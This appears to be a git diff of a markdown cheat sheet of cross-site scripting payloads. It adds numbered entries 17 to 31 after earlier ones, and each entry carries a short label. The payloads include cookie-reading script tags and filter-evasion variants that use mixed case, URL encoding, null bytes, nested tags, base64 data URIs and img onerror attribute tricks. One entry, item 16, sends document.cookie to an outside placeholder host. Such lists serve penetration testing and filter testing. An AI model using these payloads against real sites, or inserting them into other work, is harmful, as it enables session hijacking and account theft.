@@ -40,11 +40,51 @@
 
 13- `#<script>alert(1)</script>` &nbsp;  &nbsp;  |  &nbsp;  __exploiting the DOM xss with hash.substring__
 
+
 14- `#javascript:alert(1)`  &nbsp;  &nbsp; |  &nbsp;  __exploiting the DOM xss with hash.substring__
+
 
 15- `" onmouseover="alert(1)` &nbsp;  &nbsp; |  &nbsp;
 
+
 16- `<script> var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)</script>` | __to get cookie__
+
+
+17- `“><script >alert(document.cookie)</script >` |  __to get cookie__
+
+
+18- `“><ScRiPt>alert(document.cookie)</ScRiPt>` 
+
+
+19- ` “%3e%3cscript%3ealert(document.cookie)%3c/script%3e` 
+
+
+20- `“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>`
+
+
+21- `%00“><script>alert(document.cookie)</script>`
+
+22- `<object data=”data:text/html,<script>alert(1)</script>”>`
+
+23- `<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>`
+
+24- `<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>`
+
+25- `Click here</a>`
+
+26- `<img o[%00]nerror=alert(1) src=a> ` | to bypass attribute filters
+
+27- `<img onerror=”alert(1)”src=a>`   | attribute delimiter
+
+28- `<img onerror=’alert(1)’src=a>` | attribute delimiter      
+
+29- `<img onerror=`alert(1)`src=a>` | attribute delimiter
+
+30- `<img onerror=a[%00]lert(1) src=a>` | attribute value
+
+31- `<img onerror=a&#x6c;ert(1) src=a>` | attribute value
+
+
 
 ### Extra Resources:
 
